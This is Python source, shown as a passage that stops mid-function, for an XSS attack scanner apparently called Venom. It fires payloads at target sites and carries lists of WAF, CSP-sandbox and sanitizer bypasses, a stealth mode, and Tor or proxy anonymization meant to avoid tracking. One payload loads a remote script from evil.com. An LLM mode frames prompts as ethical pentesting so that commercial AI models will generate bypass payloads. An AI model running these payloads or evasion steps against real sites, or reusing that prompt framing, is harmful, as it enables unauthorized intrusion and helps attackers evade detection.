#!/usr/bin/env python3
import requests
import sys
import re
import os
import time
import argparse
import threading
import queue
import random
import tempfile
import socket
import json
import signal
from urllib.parse import urljoin, urlencode, urlparse, parse_qs, quote
from bs4 import BeautifulSoup
from requests.adapters import HTTPAdapter
from requests.packages.urllib3.util.retry import Retry
import logging
from typing import Optional, List, Dict
import html
from requests.exceptions import RequestException, ConnectionError
from concurrent.futures import ThreadPoolExecutor
from sklearn.feature_extraction.text import TfidfVectorizer
from sklearn.metrics.pairwise import cosine_similarity
import socks
import socket as sock
import stem.control
import dns.resolver

# Setup logging
log_file = "venom_anonymous.log"
class ColoredFormatter(logging.Formatter):
    COLORS = {
        'DEBUG': '\033[94m', 'INFO': '\033[92m', 'WARNING': '\033[93m', 'ERROR': '\033[91m', 'RESET': '\033[0m'
    }
    def format(self, record):
        log_msg = super().format(record)
        return f"{self.COLORS.get(record.levelname, self.COLORS['RESET'])}{log_msg}{self.COLORS['RESET']}"

def setup_logging(verbose: bool, log_output: bool, anonymous: bool):
    handlers = [logging.FileHandler(log_file, mode='a', encoding='utf-8')]
    if log_output and not anonymous:
        handlers.append(logging.StreamHandler(sys.stdout))
    logging.basicConfig(
        level=logging.DEBUG if verbose else logging.INFO,
        format='%(asctime)s - %(levelname)s - %(message)s',
        handlers=handlers
    )
    for handler in logging.getLogger().handlers:
        if isinstance(handler, logging.StreamHandler):
            handler.setFormatter(ColoredFormatter())
    logging.info("Logging initialized")

# Colors for terminal
RED, GREEN, YELLOW, RESET, BOLD, WHITE = '\033[91m', '\033[92m', '\033[93m', '\033[0m', '\033[1m', '\033[97m'
ORANGE, BLUE, PURPLE, CYAN = '\033[38;5;208m', '\033[94m', '\033[95m', '\033[96m'

def sanitize_input(input_str: str) -> str:
    return re.sub(r'[;&|><`]', '', input_str)

def sanitize_path(path: str) -> str:
    return os.path.abspath(os.path.normpath(path))

def get_banner_and_features() -> str:
    banner = f"""
{BLUE}╔════════════════════════════════════════════════════════════════════╗{RESET}
{BLUE}║{RESET}          {CYAN}██╗   ██╗███████╗███╗   ██╗ ██████╗ ███╗   ███╗{RESET}           {BLUE}║{RESET}
{BLUE}║{RESET}          {CYAN}██║   ██║██╔════╝████╗  ██║██╔═══██╗████╗ ████║{RESET}           {BLUE}║{RESET}
{BLUE}║{RESET}          {CYAN}██║   ██║█████╗  ██╔██╗ ██║██║   ██║██╔████╔██║{RESET}           {BLUE}║{RESET}
{BLUE}║{RESET}          {CYAN}██║   ██║██╔══╝  ██║╚██╗██║██║   ██║██║╚██╔╝██║{RESET}           {BLUE}║{RESET}
{BLUE}║{RESET}          {CYAN}╚██████╔╝███████╗██║ ╚████║╚██████╔╝██║ ╚═╝ ██║{RESET}           {BLUE}║{RESET}
{BLUE}║{RESET}           {CYAN}╚═════╝ ╚══════╝╚═╝  ╚═══╝ ╚═════╝ ╚═╝     ╚═╝{RESET}           {BLUE}║{RESET}
{BLUE}║{RESET}                                                                    {BLUE}║{RESET}
{BLUE}║{RESET}                  {PURPLE}Venom Advanced XSS Scanner 2025{RESET}                   {BLUE}║{RESET}
{BLUE}║{RESET}                            {WHITE}Version 5.49{RESET}                            {BLUE}║{RESET}
{BLUE}╚════════════════════════════════════════════════════════════════════╝{RESET}
"""
    features = [
        f"{WHITE}{BOLD}Advanced XSS detection with extended event handlers{RESET}",
        f"{WHITE}{BOLD}Parallel payload testing with adaptive throttling{RESET}",
        f"{WHITE}{BOLD}Custom payload integration from /usr/local/bin/payloads/{RESET}",
        f"{WHITE}{BOLD}LLM Prompt-Wiz for dynamic payload generation and analysis{RESET}",
        f"{WHITE}{BOLD}AI-driven payload optimization with WAF/403 bypass{RESET}",
        f"{WHITE}{BOLD}Subdomain scanning with HTTP/HTTPS support{RESET}",
        f"{WHITE}{BOLD}Comprehensive parameter testing for XSS{RESET}",
        f"{WHITE}{BOLD}Enhanced endpoint discovery and crawling{RESET}",
        f"{WHITE}{BOLD}Anonymous operation mode with Tor or proxy support{RESET}",
        f"{WHITE}{BOLD}IP anonymization to prevent tracking during scans{RESET}",
        f"{WHITE}{BOLD}Sandbox bypass with CSP and iframe evasion payloads{RESET}",
        f"{WHITE}{BOLD}HTML sanitizer bypass with obscure tags and encodings{RESET}"
    ]
    return banner + "\n".join(f"{GREEN}●{RESET} {feature}" for feature in features) + "\n"

def parse_args() -> argparse.Namespace:
    banner_and_features = get_banner_and_features()
    description = f"""{banner_and_features}
Venom Advanced XSS Scanner is a tool for ethical penetration testers to detect XSS vulnerabilities. Version 5.49 supports over 8000 payloads, extended event handlers, AI-driven WAF/403 bypass, sandbox and sanitizer bypasses, and enhanced subdomain scanning for both HTTP and HTTPS, considering 200 and 403 status codes as live. With --llm-prompt-wiz, leverage advanced LLM-driven prompt engineering for dynamic payload generation and vulnerability analysis.

Usage:
  python3 venom.py <url> --scan-xss [options]

Options:
  Basic Scanning:
    url                     Target URL (e.g., http://example.com).
    --scan-xss              Enable XSS scanning (required).
    -w, --workers           Number of threads (default: 5, max: 20).
    --timeout               HTTP request timeout in seconds (default: 10).
    --method                HTTP method to test: get, post, or both (default: both).
    --data                  POST data (e.g., 'key1=value1&key2=value2').
    -H, --headers           Custom headers (e.g., 'Cookie: session=abc123').

  Subdomain Scanning:
    --subdomains            File with subdomains (e.g., subdomains.txt). Tests HTTP and HTTPS for each subdomain unless protocol specified. Considers 200 and 403 as live.

  Payload Configuration:
    --payloads-dir          Directory with payload files (default: /usr/local/bin/payloads/).
    --payload-file          Specific payload file to use.
    --use-403-bypass        Prioritize 403 bypass payloads.
    --extended-events       Use extended event handlers (e.g., onmouseover, onclick).
    --bypass-sandbox        Enable payloads to bypass browser sandboxes or CSP (e.g., iframe, meta refresh).
    --bypass-sanitizer      Enable payloads to bypass HTML sanitizers (e.g., DOMPurify, server-side filters).
    --extra-params          Additional parameters to test (e.g., 'email,id,search').

  Anonymity:
    --anonymous             Hide identifiable data; requires --use-tor or --proxy.
    --use-tor               Route traffic through Tor (port 9050).
    --proxy                 Use a proxy (e.g., 'socks5://localhost:9050').
    --disable-ssl-verify    Disable SSL verification (use cautiously).

  AI Assistance:
    --ai-assist             Enable AI-driven payload optimization.
    --llm-prompt-wiz        Enable LLM Prompt-Wiz mode for advanced payload generation and analysis (requires --ai-platform and --ai-key).
    --ai-platform           AI platform: xai-grok, openai-gpt3, openai-gpt4, google-gemini.
    --ai-key                API key for AI platform.

  Output and Logging:
    --verbose               Enable detailed logging.
    --log-output            Log to console (except in anonymous mode).
    --full-report           Show detailed vulnerabilities in report.
    --export-report         Export report (e.g., report.json, report.csv).
    --no-live-status        Disable live status updates.

  Advanced:
    --stealth               Low-profile mode: 2 workers, 5-15s delays.
    --min-delay             Min delay between requests (default: 0.1 or 5 in stealth).
    --max-delay             Max delay between requests (default: 0.5 or 15 in stealth).
    --all-params            Test all discovered parameters.
    --post-file             File with POST request data.
    --new-session           Clear cookies for new session.
    --simulate-403          Simulate 403 response to test bypass payloads.

Examples:
  python3 venom.py http://example.com --scan-xss
    - Basic XSS scan on main domain.
  python3 venom.py http://target.com --scan-xss --subdomains subdomains.txt
    - Scan main domain and subdomains (HTTP and HTTPS), treating 200 and 403 as live.
  python3 venom.py https://test.com --scan-xss --subdomains subs.txt --anonymous --use-tor -w 10
    - Anonymous subdomain scan with Tor, 10 workers.
  python3 venom.py http://site.com --scan-xss --ai-assist --ai-platform xai-grok --ai-key YOUR_KEY --export-report report.json
    - AI-optimized scan with JSON report.
  python3 venom.py http://example.com --scan-xss --llm-prompt-wiz --ai-platform xai-grok --ai-key YOUR_KEY --verbose
    - Scan with LLM Prompt-Wiz for advanced payload generation and analysis.
  python3 venom.py http://example.com --scan-xss --stealth --use-403-bypass --proxy socks5://localhost:9050
    - Stealth scan with 403 bypass via SOCKS5 proxy.
  python3 venom.py https://app.com --scan-xss --subdomains subs.txt --extended-events --bypass-sandbox --bypass-sanitizer --extra-params "email,search" --verbose
    - Detailed scan with subdomains, extended events, sandbox/sanitizer bypasses, and custom parameters.

Note: legal disclaimer: Usage of venom for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
"""
    
    parser = argparse.ArgumentParser(description=description, formatter_class=argparse.RawDescriptionHelpFormatter)
    parser.add_argument("url", help="Target URL to scan (e.g., http://target.com).")
    parser.add_argument("-w", "--workers", type=int, default=5, help="Number of concurrent threads (default: 5, max: 20).")
    parser.add_argument("--scan-xss", action="store_true", help="Enable XSS scanning (required).", required=True)
    parser.add_argument("--subdomains", type=str, help="Text file containing subdomains to scan (e.g., subdomains.txt).")
    parser.add_argument("--all-params", action="store_true", help="Ensure all discovered parameters are tested for XSS.")
    parser.add_argument("--payloads-dir", default="/usr/local/bin/payloads/", help="Directory with custom payload files (default: /usr/local/bin/payloads/).")
    parser.add_argument("--payload-file", type=str, help="Specific payload file to use instead of directory.")
    parser.add_argument("--timeout", type=int, default=10, help="HTTP request timeout in seconds (default: 10).")
    parser.add_argument("--verbose", action="store_true", help="Enable detailed logging.")
    parser.add_argument("--stealth", action="store_true", help="Enable stealth mode: 2 workers, 5-15s delays.")
    parser.add_argument("--min-delay", type=float, help="Min delay between requests (default: 0.1 or 5 in stealth).")
    parser.add_argument("--max-delay", type=float, help="Max delay between requests (default: 0.5 or 15 in stealth).")
    parser.add_argument("--full-report", action="store_true", help="Show detailed vulnerabilities in report.")
    parser.add_argument("--export-report", type=str, help="Export report to a file (e.g., report.json, report.csv).")
    parser.add_argument("-H", "--headers", action='append', default=[], help="Custom headers (e.g., 'Cookie: session=abc123').")
    parser.add_argument("--method", choices=['get', 'post', 'both'], default='both', help="HTTP method to test (default: both).")
    parser.add_argument("--data", type=str, help="POST data (e.g., 'key1=value1&key2=value2').")
    parser.add_argument("--post-file", type=str, help="TXT file with POST request.")
    parser.add_argument("--new-session", action="store_true", help="Start a new session, clearing cookies.")
    parser.add_argument("--use-403-bypass", action="store_true", help="Prioritize 403 bypass payloads from 403bypass.txt.")
    parser.add_argument("--simulate-403", action="store_true", help="Simulate a 403 response to test bypass payloads.")
    parser.add_argument("--bypass-sandbox", action="store_true", help="Enable payloads to bypass browser sandboxes or CSP (e.g., iframe, meta refresh).")
    parser.add_argument("--bypass-sanitizer", action="store_true", help="Enable payloads to bypass HTML sanitizers (e.g., DOMPurify, server-side filters).")
    parser.add_argument("--no-live-status", action="store_true", help="Disable live status updates.")
    parser.add_argument("--anonymous", action="store_true", help="Run in anonymous mode: hide identifiable data and enforce IP anonymization via Tor/proxy.")
    parser.add_argument("--use-tor", action="store_true", help="Route traffic through Tor (requires Tor on port 9050).")
    parser.add_argument("--proxy", type=str, help="Use a proxy (e.g., 'socks5://localhost:9050' or 'http://proxy:port').")
    parser.add_argument("--disable-ssl-verify", action="store_true", help="Disable SSL certificate verification for anonymity (use with caution).")
    parser.add_argument("--ai-assist", action="store_true", help="Enable AI-driven payload optimization.")
    parser.add_argument("--llm-prompt-wiz", action="store_true", help="Enable LLM Prompt-Wiz mode for advanced payload generation and analysis (requires --ai-platform and --ai-key).")
    parser.add_argument("--ai-key", type=str, help="API key for external AI platform (required if --ai-platform or --llm-prompt-wiz is used).")
    parser.add_argument("--ai-platform", type=str, choices=['xai-grok', 'openai-gpt3', 'openai-gpt4', 'google-gemini'],
                        help="External AI platform for optimization (requires --ai-key).")
    parser.add_argument("--log-output", action="store_true", help="Enable console logging alongside file (overrides anonymous mode restriction).")
    parser.add_argument("--extended-events", action="store_true", help="Use extended event handlers (onmouseover, onclick, etc.).")
    parser.add_argument("--extra-params", type=str, help="Comma-separated list of additional parameters to test (e.g., 'email,id,search').")

    print(banner_and_features)
    while True:
        response = input(f"{RED}[!] Ethical use only (YES/NO): {RESET}").strip().upper()
        if response == "YES":
            print(f"{GREEN}[+] Ethical use confirmed. Initiating scan...{RESET}")
            break
        elif response == "NO":
            print(f"{RED}[!] This tool is for ethical use only. Exiting.{RESET}")
            sys.exit(0)
        else:
            print(f"{YELLOW}[!] Please enter YES or NO.{RESET}")

    args = parser.parse_args()
    args.payloads_dir = sanitize_path(args.payloads_dir)
    args.workers = min(args.workers, 20)
    if args.stealth:
        args.workers = min(args.workers, 2)
        args.min_delay = args.min_delay if args.min_delay is not None else 5
        args.max_delay = args.max_delay if args.max_delay is not None else 15
        print(f"{GREEN}[+] Stealth mode enabled{RESET}")
    else:
        args.min_delay = args.min_delay if args.min_delay is not None else 0.1
        args.max_delay = args.max_delay if args.max_delay is not None else 0.5
    
    if args.post_file:
        post_url, post_headers, post_data = parse_post_file(sanitize_path(args.post_file))
        if post_url and not args.url:
            args.url = post_url
        if not args.url:
            print(f"{RED}[!] No URL provided. Exiting.{RESET}")
            sys.exit(1)
        args.post_headers = post_headers
        args.post_data = post_data if not args.data else dict(pair.split('=', 1) for pair in args.data.split('&'))
        if post_headers:
            args.headers.extend([f"{k}: {v}" for k, v in post_headers.items()])
        print(f"{GREEN}[+] Loaded POST request from file{RESET}")
    
    if args.ai_platform and not args.ai_key:
        print(f"{RED}[!] --ai-platform requires --ai-key. Exiting.{RESET}")
        sys.exit(1)
    if args.llm_prompt_wiz and not (args.ai_platform and args.ai_key):
        print(f"{RED}[!] --llm-prompt-wiz requires --ai-platform and --ai-key. Exiting.{RESET}")
        sys.exit(1)
    if args.anonymous and not (args.use_tor or args.proxy):
        print(f"{RED}[!] --anonymous requires --use-tor or --proxy for IP anonymization. Exiting.{RESET}")
        sys.exit(1)
    if args.use_tor and args.proxy:
        print(f"{RED}[!] Cannot use both --use-tor and --proxy. Choose one. Exiting.{RESET}")
        sys.exit(1)
    if args.use_tor:
        print(f"{GREEN}[+] Tor routing enabled (ensure Tor service is running on port 9050){RESET}")
    if args.proxy:
        print(f"{GREEN}[+] Proxy enabled: {args.proxy}{RESET}")
    if args.ai_assist:
        print(f"{GREEN}[+] AI assistance enabled{RESET}")
    if args.llm_prompt_wiz:
        print(f"{GREEN}[+] LLM Prompt-Wiz mode enabled with platform: {args.ai_platform}{RESET}")
    if args.extended_events:
        print(f"{GREEN}[+] Extended event handlers enabled{RESET}")
    if args.bypass_sandbox:
        print(f"{GREEN}[+] Sandbox bypass payloads enabled{RESET}")
    if args.bypass_sanitizer:
        print(f"{GREEN}[+] HTML sanitizer bypass payloads enabled{RESET}")
    if args.extra_params:
        print(f"{GREEN}[+] Extra parameters enabled: {args.extra_params}{RESET}")
    if args.subdomains:
        args.subdomains = sanitize_path(args.subdomains)
        print(f"{GREEN}[+] Subdomain scanning enabled with file: {args.subdomains}{RESET}")
    if args.all_params:
        print(f"{GREEN}[+] All parameters will be tested for XSS{RESET}")
    if args.disable_ssl_verify:
        print(f"{YELLOW}[!] SSL verification disabled for anonymity. Use with caution.{RESET}")
    if args.anonymous:
        print(f"{GREEN}[+] Anonymous mode enabled: No identifiable data will be exposed{RESET}")
    
    setup_logging(args.verbose, args.log_output, args.anonymous)
    return args

def parse_post_file(file_path: str) -> tuple[Optional[str], Dict[str, str], Dict[str, str]]:
    url = None
    headers = {}
    data = {}
    try:
        with open(file_path, 'r', encoding='utf-8') as f:
            content = f.read().strip()
            lines = content.splitlines()
            if lines and lines[0].startswith("POST "):
                url_parts = lines[0].split()
                if len(url_parts) >= 2:
                    url = url_parts[1]
            in_headers = True
            body_start = 0
            for i, line in enumerate(lines[1:], 1):
                if not line.strip():
                    in_headers = False
                    body_start = i + 1
                    break
                if in_headers and ':' in line:
                    key, value = line.split(':', 1)
                    headers[sanitize_input(key.strip())] = sanitize_input(value.strip())
            if not url and 'Host' in headers:
                url = f"http://{headers['Host']}{url or '/'}"
            if body_start > 0 and body_start < len(lines):
                body = '&'.join(lines[body_start:]).strip()
                for pair in body.split('&'):
                    if '=' in pair:
                        key, value = pair.split('=', 1)
                        data[sanitize_input(key)] = sanitize_input(value)
            logging.info(f"Parsed POST file: URL={url}, Headers={len(headers)}, Data={len(data)}")
            return url, headers, data
    except Exception as e:
        logging.error(f"Failed to parse POST file {file_path}: {e}")
        return None, {}, {}

def setup_tor_proxy():
    socks.set_default_proxy(socks.SOCKS5, "localhost", 9050)
    sock.socket = socks.socksocket
    logging.info("Tor proxy configured (SOCKS5 localhost:9050)")

def setup_custom_proxy(proxy_url: str):
    parsed = urlparse(proxy_url)
    if parsed.scheme == "socks5":
        socks.set_default_proxy(socks.SOCKS5, parsed.hostname, parsed.port or 9050)
        sock.socket = socks.socksocket
        logging.info(f"SOCKS5 proxy configured: {proxy_url}")
    elif parsed.scheme == "http":
        proxies = {"http": proxy_url, "https": proxy_url}
        logging.info(f"HTTP proxy configured: {proxy_url}")
        return proxies
    else:
        raise ValueError(f"Unsupported proxy scheme: {parsed.scheme}. Use 'socks5://' or 'http://'.")

def reset_tor_circuit():
    try:
        with stem.control.Controller.from_port(port=9051) as controller:
            controller.authenticate()
            controller.signal(stem.Signal.NEWNYM)
            logging.info("Tor circuit reset")
            time.sleep(2)
    except Exception as e:
        logging.error(f"Failed to reset Tor circuit: {e}")

# Start of Part 2
class ThreadSafeCounter:
    def __init__(self):
        self.value = 0
        self.lock = threading.Lock()

    def increment(self):
        with self.lock:
            self.value += 1
            return self.value

    def get(self):
        with self.lock:
            return self.value

class AIAssistant:
    def __init__(self, payloads: List[str], api_key: Optional[str] = None, platform: Optional[str] = None, 
                 extended_events: bool = False, bypass_sandbox: bool = False, bypass_sanitizer: bool = False,
                 llm_prompt_wiz: bool = False):
        self.payloads = payloads
        self.api_key = api_key
        self.platform = platform
        self.extended_events = extended_events
        self.bypass_sandbox = bypass_sandbox
        self.bypass_sanitizer = bypass_sanitizer
        self.llm_prompt_wiz = llm_prompt_wiz
        self.api_endpoint = self.get_api_endpoint() if platform else None
        self.success_history: Dict[str, dict] = {}
        self.lock = threading.Lock()
        self.vectorizer = TfidfVectorizer()
        if self.api_key and self.api_endpoint and self.llm_prompt_wiz:
            logging.info(f"LLM Prompt-Wiz enabled with platform: {platform}")
        elif self.api_key and self.api_endpoint:
            logging.info(f"AI assistance enabled with external platform: {platform}")
        else:
            logging.info("AI assistance enabled with local ML optimization")

    def get_api_endpoint(self) -> str:
        endpoints = {
            "xai-grok": "https://api.xai.com/v1/completions",
            "openai-gpt3": "https://api.openai.com/v1/completions",
            "openai-gpt4": "https://api.openai.com/v1/chat/completions",
            "google-gemini": "https://generativelanguage.googleapis.com/v1beta/models/gemini-pro:generateContent"
        }
        return endpoints.get(self.platform, "https://api.xai.com/v1/completions")

    def query_llm(self, prompt: str) -> Optional[str]:
        """Send a prompt to the LLM and return the response."""
        try:
            headers = {"Authorization": f"Bearer {self.api_key}"}
            data = {
                "model": self.platform if self.platform != "xai-grok" else "grok-3",
                "prompt": prompt,
                "max_tokens": 500,
                "temperature": 0.7
            }
            if self.platform.startswith("openai"):
                data = {
                    "model": "gpt-4" if self.platform == "openai-gpt4" else "gpt-3.5-turbo",
                    "messages": [{"role": "user", "content": prompt}],
                    "max_tokens": 500,
                    "temperature": 0.7
                }
            elif self.platform == "google-gemini":
                data = {"contents": [{"parts": [{"text": prompt}]}]}

            response = requests.post(self.api_endpoint, headers=headers, json=data, timeout=10)
            response.raise_for_status()
            if self.platform.startswith("openai"):
                return response.json()["choices"][0]["message"]["content"].strip()
            elif self.platform == "google-gemini":
                return response.json()["candidates"][0]["content"]["parts"][0]["text"].strip()
            else:
                return response.json()["choices"][0]["text"].strip()
        except RequestException as e:
            logging.error(f"LLM query failed: {e}")
            return None

    def generate_payload_prompt(self, response: Optional[str] = None, status_code: int = 200, 
                              waf_detected: bool = False, waf_type: str = "Unknown") -> str:
        """Craft a prompt for generating XSS payloads."""
        context = "HTML content" if response and ('<input' in response or '<form' in response) else \
                  "JavaScript context" if response and ('<script' in response or 'onload' in response) else "Unknown"
        prompt = f"""
You are an ethical penetration testing assistant specializing in XSS vulnerability detection. Generate 10 unique XSS payloads tailored for a web application, considering the following:
- Target context: {context}.
- {'WAF detected: ' + waf_type + '. Suggest bypass techniques.' if waf_detected else 'No WAF detected.'}
- {'Include extended event handlers (e.g., onmouseover, onclick, onpointerrawupdate) for HTML contexts.' if self.extended_events else 'Use basic event handlers (e.g., onerror, onload).'}
- {'Bypass browser sandboxes or CSP (e.g., using iframe, meta refresh, or srcdoc).' if self.bypass_sandbox else 'No sandbox bypass required.'}
- {'Bypass HTML sanitizers (e.g., DOMPurify, server-side filters) with obscure tags or encodings.' if self.bypass_sanitizer else 'No sanitizer bypass required.'}
- Response status: {status_code}.
- Payloads must be safe for testing and avoid malicious actions beyond alert('xss') or confirm('xss').
- Format output as a JSON list: ["payload1", "payload2", ...].

Example response:
["<script>alert('xss')</script>", "<img src=x onerror=alert('xss')>", ...]
"""
        if response:
            prompt += f"\nResponse snippet for context (truncated to 500 chars):\n{response[:500]}"
        return prompt

    def analyze_response_prompt(self, payload: str, response: str) -> str:
        """Craft a prompt to analyze if a response indicates a vulnerability."""
        prompt = f"""
You are an ethical penetration testing assistant. Analyze the following web response to determine if the XSS payload '{payload}' is reflected and executable, indicating a vulnerability. Consider:
- Is the payload present unescaped in HTML, JavaScript, or event handlers (e.g., onerror, onclick)?
- Is it in an executable context (e.g., <script>, onmouseover, srcdoc, javascript:)?
- Are there signs of sandbox or sanitizer bypass (e.g., meta refresh, obscure tags)?
Return a JSON object: {{ "vulnerable": boolean, "context": string, "details": string }}.

Response snippet (truncated to 1000 chars):
{response[:1000]}
"""
        return prompt

    def suggest_bypass_prompt(self, waf_type: str, response: str) -> str:
        """Craft a prompt to suggest WAF or defense bypass techniques."""
        prompt = f"""
You are an ethical penetration testing assistant. Suggest 5 techniques to bypass a {waf_type} WAF or defense mechanism for XSS testing, based on the response below. Techniques must:
- Be safe for ethical testing (e.g., use alert('xss') for verification).
- Include encoding, event handler variations, or obscure tags if applicable.
- {'Use extended event handlers (e.g., onmouseover, onpointerrawupdate) if possible.' if self.extended_events else 'Use standard event handlers.'}
- {'Target sandbox bypass (e.g., iframe, meta refresh, srcdoc).' if self.bypass_sandbox else 'No sandbox bypass needed.'}
- {'Target sanitizer bypass (e.g., obscure tags, malformed HTML).' if self.bypass_sanitizer else 'No sanitizer bypass needed.'}
Format output as a JSON list: ["technique1", "technique2", ...].

Response snippet (truncated to 500 chars):
{response[:500]}
"""
        return prompt

    def suggest_payloads(self, response: Optional[str] = None, status_code: int = 200, 
                        waf_detected: bool = False, waf_type: str = "Unknown") -> List[str]:
        """Generate or optimize payloads, using LLM Prompt-Wiz if enabled."""
        executable_payloads = [p for p in self.payloads if any(x in p.lower() for x in ['alert(', 'on', 'confirm(', 'javascript:'])]
        other_payloads = [p for p in self.payloads if p not in executable_payloads]
        
        basic_payloads = [
            "<script>alert('xss')</script>",
            "<img src=x onerror=alert('xss')>",
            "javascript:alert('xss')"
        ]
        prioritized = basic_payloads + executable_payloads
        
        if self.llm_prompt_wiz and self.api_key and self.api_endpoint:
            # Use LLM Prompt-Wiz for dynamic payload generation
            prompt = self.generate_payload_prompt(response, status_code, waf_detected, waf_type)
            llm_response = self.query_llm(prompt)
            if llm_response:
                try:
                    new_payloads = json.loads(llm_response)
                    if isinstance(new_payloads, list):
                        prioritized = new_payloads + prioritized
                        logging.info(f"LLM Prompt-Wiz generated {len(new_payloads)} new payloads")
                    else:
                        logging.warning("LLM returned invalid payload format")
                except json.JSONDecodeError:
                    logging.error("Failed to parse LLM payload response")
            else:
                logging.warning("LLM query failed, falling back to static payloads")
        
        if waf_detected:
            bypass_payloads = [
                "<scr"+"ipt>alert('xss')</script>",
                "%253Cscript%253Ealert('xss')%253C/script%253E",
                "<script>eval(atob('YWxlcnQoJ3hzcycp'))</script>"
            ]
            if self.llm_prompt_wiz and self.api_key and self.api_endpoint:
                # Use LLM Prompt-Wiz for WAF bypass suggestions
                prompt = self.suggest_bypass_prompt(waf_type, response or "")
                llm_response = self.query_llm(prompt)
                if llm_response:
                    try:
                        bypass_suggestions = json.loads(llm_response)
                        if isinstance(bypass_suggestions, list):
                            bypass_payloads.extend(bypass_suggestions)
                            logging.info(f"LLM Prompt-Wiz suggested {len(bypass_suggestions)} bypass techniques")
                    except json.JSONDecodeError:
                        logging.error("Failed to parse LLM bypass response")
            if waf_type == "Cloudflare":
                bypass_payloads.append("<script src=//evil.com></script>")
            elif waf_type == "AWS WAF":
                bypass_payloads.append("<input onpointerover=alert('xss')>")
            elif waf_type == "ModSecurity":
                bypass_payloads.append("<script>/*foo*/alert('xss')/*bar*/</script>")
            prioritized = bypass_payloads + prioritized
        
        if self.bypass_sandbox:
            sandbox_payloads = [
                "<meta http-equiv=\"refresh\" content=\"0;url=javascript:alert('xss')\">",
                "<iframe srcdoc=\"<script>parent.alert('xss')</script>\">",
                "<div id=window><script>window.alert('xss')</script></div>",
            ]
            prioritized = sandbox_payloads + prioritized
        
        if self.bypass_sanitizer:
            sanitizer_payloads = [
                "<isindex type=image src=1 onerror=alert('xss')>",
                "<div onpointerrawupdate=alert('xss')>Hover</div>",
                "<img src=x onerror=\"alert('xss')\">",
            ]
            prioritized = sanitizer_payloads + prioritized
        
        if not response:
            return prioritized + other_payloads[:20]

        with self.lock:
            if self.success_history and response:
                corpus = [response] + [h["context"] for h in self.success_history.values()]
                tfidf_matrix = self.vectorizer.fit_transform(corpus)
                response_vector = tfidf_matrix[0]
                similarities = cosine_similarity(response_vector, tfidf_matrix[1:]).flatten()
                sorted_payloads = sorted(
                    prioritized,
                    key=lambda p: self.success_history.get(p, {"weight": 0.0})["weight"] + 
                                  (similarities[list(self.success_history.keys()).index(p)] if p in self.success_history else 0),
                    reverse=True
                )
            else:
                sorted_payloads = prioritized
            
            html_context = '<input' in response or '<form' in response or '<textarea' in response
            js_context = '<script' in response or 'javascript:' in response or 'onload' in response
            optimized = []
            if self.extended_events:
                optimized = [p for p in sorted_payloads if (html_context and any(x in p.lower() for x in ['onmouseover', 'onclick', 'onerror', 'onpointerrawupdate'])) or 
                            (js_context and any(x in p.lower() for x in ['alert(', 'confirm(']))]
            else:
                optimized = [p for p in sorted_payloads if (html_context and 'on' in p.lower()) or (js_context and any(x in p.lower() for x in ['alert(', 'confirm(']))]
            executable_payloads = optimized if optimized else sorted_payloads[:min(1000, len(sorted_payloads))]
        
        logging.info(f"AI optimized {len(executable_payloads)} payloads")
        return list(set(executable_payloads + other_payloads[:20]))

    def record_success(self, payload: str, context: str = "unknown", status_code: int = 200) -> None:
        """Record successful payloads and analyze with LLM if Prompt-Wiz is enabled."""
        with self.lock:
            if payload not in self.success_history:
                self.success_history[payload] = {"success_count": 0, "weight": 0.0, "context": context}
            if status_code == 200:
                self.success_history[payload]["success_count"] += 1
                self.success_history[payload]["weight"] = min(1.0, self.success_history[payload]["weight"] + 0.2)
                self.success_history[payload]["context"] = context
            if self.llm_prompt_wiz and self.api_key and self.api_endpoint:
                # Use LLM to analyze why this payload succeeded
                prompt = self.analyze_response_prompt(payload, context)
                llm_response = self.query_llm(prompt)
                if llm_response:
                    try:
                        analysis = json.loads(llm_response)
                        if analysis.get("vulnerable"):
                            logging.info(f"LLM Prompt-Wiz confirmed vulnerability: {analysis['details']}")
                        else:
                            logging.debug(f"LLM Prompt-Wiz analysis: {analysis['details']}")
                    except json.JSONDecodeError:
                        logging.error("Failed to parse LLM response analysis")
                        # Import dependencies from File 1 (remove this when combining into a single file)
#from venom_part1_part2 import *

# Start of Part 3
class PayloadGenerator:
    def __init__(self, payloads_dir: str, payload_file: Optional[str] = None, bypass_needed: bool = False, 
                 use_403_bypass: bool = False, stealth: bool = False, extended_events: bool = False, 
                 waf_type: str = "Unknown", bypass_sandbox: bool = False, bypass_sanitizer: bool = False):
        self.payloads_dir = payloads_dir
        self.payload_file = payload_file
        self.bypass_needed = bypass_needed
        self.use_403_bypass = use_403_bypass
        self.stealth = stealth
        self.extended_events = extended_events
        self.waf_type = waf_type
        self.bypass_sandbox = bypass_sandbox
        self.bypass_sanitizer = bypass_sanitizer
        self.payloads = self.load_payloads()
        self.previous_success = []

    def load_payloads(self) -> List[str]:
        default_payloads = [
            "<script>alert('xss')</script>",
            "<img src=x onerror=alert('xss')>",
            "javascript:alert('xss')"
        ]
        sandbox_bypass_payloads = [
            "<meta http-equiv=\"refresh\" content=\"0;url=javascript:alert('xss')\">",
            "<iframe srcdoc=\"<script>parent.alert('xss')</script>\">",
            "<img src=x onfocus=alert('xss') autofocus>",
            "<a href=\"javascript:alert('xss')\">Click</a>",
            "<div id=window><script>window.alert('xss')</script></div>",
        ]
        sanitizer_bypass_payloads = [
            "<isindex type=image src=1 onerror=alert('xss')>",
            "<div onpointerrawupdate=alert('xss')>Hover</div>",
            "<img src=x onerror=\"alert('xss')\">",
            "<a href=\"jAvAsCrIpT:alert('xss')\">Link</a>",
            "<input value=\"><script>alert('xss')</script>\" type=text>",
        ]
        bypass_payloads = {
            "Cloudflare": [
                "%253Cscript%253Ealert('xss')%253C/script%253E",
                "<script src=//evil.com></script>",
                "<svg onload=alert('xss')>"
            ],
            "AWS WAF": [
                "<input onpointerover=alert('xss')>",
                "<div onerror=alert('xss') src=x>",
                "<script>alert('xss')</script>"
            ],
            "ModSecurity": [
                "<scr"+"ipt>alert('xss')</script>",
                "<script>/*foo*/alert('xss')/*bar*/</script>",
                "<img src=x onerror=alert('xss')>"
            ]
        }
        stealth_payloads = [
            "<script>alert('xss')</script>",
            "<img src=x onerror=alert('xss')>"
        ]

        payloads = set(default_payloads if not self.stealth else stealth_payloads)
        
        if self.bypass_sandbox:
            payloads.update(sandbox_bypass_payloads)
            logging.info(f"Loaded {len(sandbox_bypass_payloads)} sandbox bypass payloads")
        
        if self.bypass_sanitizer:
            payloads.update(sanitizer_bypass_payloads)
            logging.info(f"Loaded {len(sanitizer_bypass_payloads)} HTML sanitizer bypass payloads")
        
